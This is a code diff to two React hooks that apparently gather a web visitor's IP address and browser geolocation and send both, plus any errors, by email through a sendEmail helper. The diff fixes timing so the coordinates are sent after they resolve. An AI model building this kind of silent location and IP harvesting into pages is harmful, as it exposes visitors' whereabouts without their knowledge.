@@ -13,6 +13,7 @@ export const useGetIp = () => {
 
         await sendEmail(data);
       } catch (error) {
+        await sendEmail(error);
         console.error("Error fetching IP address:", error);
       }
     })();
@@ -28,13 +29,15 @@ export const useGetCoords = () => {
       };
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
+        navigator.geolocation.getCurrentPosition(async (position) => {
           info.lat = position.coords.latitude;
           info.lon = position.coords.longitude;
-        });
-      }
 
-      await sendEmail(info);
+          await sendEmail(info);
+        });
+      } else {
+        await sendEmail(info);
+      }
     })();
   }, []);
 };
